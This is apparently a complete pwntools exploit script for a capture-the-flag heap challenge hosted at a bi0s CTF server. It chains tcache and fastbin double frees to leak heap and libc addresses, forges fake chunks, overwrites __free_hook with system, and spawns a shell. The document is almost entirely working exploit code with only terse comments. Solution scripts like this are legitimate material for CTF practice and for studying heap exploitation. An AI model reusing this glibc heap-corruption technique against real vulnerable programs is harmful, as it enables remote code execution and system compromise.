#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('chall')
libc = ELF('./libc.so.6') if args.REMOTE else ELF('/lib/x86_64-linux-gnu/libc.so.6')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote("pwn.challenge.bi0s.in", 1234)

    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)

    return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
directory /opt/glibc
continue
'''.format(**locals())

def add(len, data):
    io.sendlineafter(b"Choice >> ", b"1")
    io.sendlineafter(b"Enter length : ", str(len).encode())
    io.sendlineafter(b"Enter data : ", data)

def remove(idx, off, leak=b'n'):
    io.sendlineafter(b"Choice >> ", b"2")
    io.sendlineafter(b"Enter index: ", str(idx).encode())
    if(leak=='n'):
        io.sendlineafter(b"Which one?(1337 for all) ", str(off).encode())
    else:
        leak = io.recvline()
        io.sendlineafter(b"Which one?(1337 for all) ", str(off).encode())
        return leak.strip()

def link(to, fr):
    io.sendlineafter(b"Choice >> ", b"3")
    io.sendlineafter(b"Enter to index: ", str(to).encode())
    io.sendlineafter(b"Enter from index: ", str(fr).encode())

def unlink(idx, off, choice=b"y"):
    io.sendlineafter(b"Choice >> ", b"4")
    io.sendlineafter(b"Enter index: ", str(idx).encode())
    io.sendlineafter(b"Enter offset: ", str(off).encode())
    io.sendlineafter(b"Do you want to keep it (y/n)? ", choice)

io = start()

################################################################################
# HEAP LEAK
################################################################################

for i in range(10):
    add(0x30, chr(ord("a")+i).encode())

link(1, 2)
link(1, 0)          # 1 -> 2 -> 0

for i in range(7):
    remove(9-i, 1)       # filling tcache

unlink(1, 2)         # Table: [ 2 -> 0, 1 -> 0 ]
remove(1, 2)         # Table: [ 2 -> 0 (freed), 1 ]
remove(0, 1337)      # free(2), free(0) (double free in fastbins)

# Table: [ null, 1, null, ... null ]

for i in range(7):              # freeing up tcache
    add(0x30, b"aaaa")   # Table: [ 0, 1, 2, ... 7, null, null ]

## 8, 9 free

add(0x30, b"a"*16)        # Table: [ 0, 1, 2, ... 7, 8, null ]

# here probably one chunk (8) from fastbins is taken to malloc() and second one is stashed in tcache
# after removing the chunk (8) it lands in tcache and we have double free
remove(8, 1)       # double free in tcache

for i in range(6):     # free up space in the global array
    remove(2+i, 1)

add(0x10, b"1111")      # remove 2 chunks from tcache
add(0x20, b"1111")      # remove 1 chunk from 0x10 tcache

add(0x10, b"")          # set the fd's last bit as null making it point to an already allocated chunk
add(0x20, b"1111")      # remove one more 0x10 chunk
add(0x10, b"")          # this will make buf pointer in two places in the array
remove(6, 1)           # free in one place and view in other place to get heap leak
remove(0, 1)           # to avoid double free error in fastbin

heap = u64(remove(1, 1, 'y')[-6:].ljust(8, b"\x00")) - 0x5f0
log.info("Heap @ "+str(hex(heap)))

################################################################################
# FAKE CHUNK
################################################################################

# Cleanup global array
for i in range(4):
    remove(2+i, 1)

payload = p64(0)*3 + p64(0x21)

add(0x30, payload)     # fake next chunk   # 0 this will be made into a unsorted bin

payload = p64(0)*3 + p64(0x61)

add(0x30, payload)     # fake chunk        # 1
add(0x30, b"aaa")       # random            # 2

addr = heap + 0x4a0

add(0x30, p64(addr))        # fd overwrite      # 3


add(0x30, b"aaa")       # random          # 4
add(0x30, b"aaa")       # random          # 5
add(0x30, b"--------")       # random          # 6

remove(6, 1)

# this will make a structure like:
# 0000000000000000 0000000000000021
# 0000000000000000 0000000000000030
# 00000000data_ptr 0000000000000431 <- data_ptr
# chunk 0x20 - our node with data pointing to next chunk
# chunk 0x431 - data
payload = p64(0)*3 + p64(0x21) + p64(0) + p64(0x30) + p64(heap+0x4e0) + p64(0x431)
add(0x50, payload)           # 6
log.info("Added 0x50 chunk with payload")

log.info("Removing 3 chunks from 2 to 4")
for i in range(3):
    remove(i+2, 1)

for i in range(3):
    add(0x60, b"aaaa")

remove(2, 1)
remove(3, 1)

add(0x50, b"cccc")        # 2
add(0x50, b"cccc")        # 3

remove(2, 1)
remove(3, 1)

payload = p64(0)*7 + p64(0x61)

add(0x41, payload) # 2
add(0x40, b"aaaa")          # 3

# cleanup
log.info("Here data of chunk 0 lands in unsorted bins")
remove(0, 1)
log.info("Cleaning up...")
remove(1, 1)
remove(4, 1)
remove(6, 1)

################################################################################
# LIBC LEAK
################################################################################

# removing 0x10 chunk from tcache so chunk above unsorted chunk is on top
add(0x10, b"aaaa")   # 1
log.info("Removed 0x10 chunk from tcache")
add(0x20, b"aaaa")   # 2

add(0x40, b"aaaa")  # 4 - leaker chunk

remove(2, 1)
# edit the buf pointer to point to libc address
payload = p64(0)*3 + p64(0x21) + p64(0) + p64(0x40) + p64(heap+0x530)
add(0x50, payload)           # 2
# leaking

link(4, 0)

# Getting libc leak
io.sendlineafter(b"Choice >> ", b"4")
io.sendlineafter(b"Enter index: ", b"4")
offset = 0x1ebbe0 if args.REMOTE else 0x1bebe0
libc.address = u64(io.recvline().strip()[-6:].ljust(8, b"\x00")) - offset
io.sendlineafter(b"Enter offset: ", b"1")
io.sendlineafter(b"Do you want to keep it (y/n)? ", b"y")
log.info("Libc @ " + str(hex(libc.address)))

remove(2, 1)
payload = p64(0)*3 + p64(0x21) + p64(0) + p64(0x40) + p64(heap+0x4e0) + b"\x51"
add(0x50, payload)           # 2

link(3, 4)
link(3, 0)
unlink(3, 2, b"y")   # free 3's 2nd offset and 0's 1337 to get the error
link(5, 3)
unlink(5, 2, b"y") # 0 and 3 1337 free and 5th 2nd offset

remove(5,2)
remove(2,1)
# freeing tcache thrice. Setting cookie to null
payload = p64(0)*3 + p64(0x21) + p64(0) + p64(0x40) + p64(heap+0x4e0) + p64(0x51) + p64(0)*2
add(0x51, payload)           # 2

remove(0,1337)
remove(2,1)
# setting cookie null again
payload = p64(0)*3 + p64(0x21) + p64(0) + p64(0x40) + p64(heap+0x4e0) + p64(0x51) + p64(0)*2
add(0x51, payload)           # 0

# same chunk several times in tcache
remove(3, 1337)

hook = libc.symbols['__free_hook']
system = libc.symbols['system']

# changing fd to __free_hook
add(0x40, p64(hook)) # 2
add(0x40, b"bbbbbbbb") # 3

# setting fd of 0x10 chunk so it won't cause error
link(2, 3)

# This chunk will be used to call system
add(0x40, b"/bin/sh\x00") # 3

# overwriting __free_hook with system
add(0x40, p64(system))
# triggering system
remove(3, 1)

io.interactive()

